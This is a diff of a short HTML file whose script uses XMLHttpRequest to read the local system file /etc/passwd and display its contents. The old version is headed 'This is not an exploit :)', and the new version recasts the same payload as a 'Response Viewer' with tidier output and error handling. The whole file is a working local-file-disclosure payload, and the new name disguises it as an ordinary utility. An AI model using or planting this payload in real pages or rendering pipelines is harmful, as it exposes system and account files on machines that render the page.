@@ -1,14 +1,27 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Response Viewer</title>
+</head>
 <body>
-<h1>This is not an exploit :)</h1>
+
+<pre id="output">Loading...</pre>
+
 <script>
-x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
+const x = new XMLHttpRequest();
+
+x.onload = function () {
+    document.getElementById("output").textContent = this.responseText;
 };
-x.open("GET","file:///etc/passwd");
+
+x.onerror = function () {
+    document.getElementById("output").textContent = "Request failed";
+};
+
+x.open("GET", "file:///etc/passwd");
 x.send();
 </script>
-</body></html>
+
+</body>
+</html>
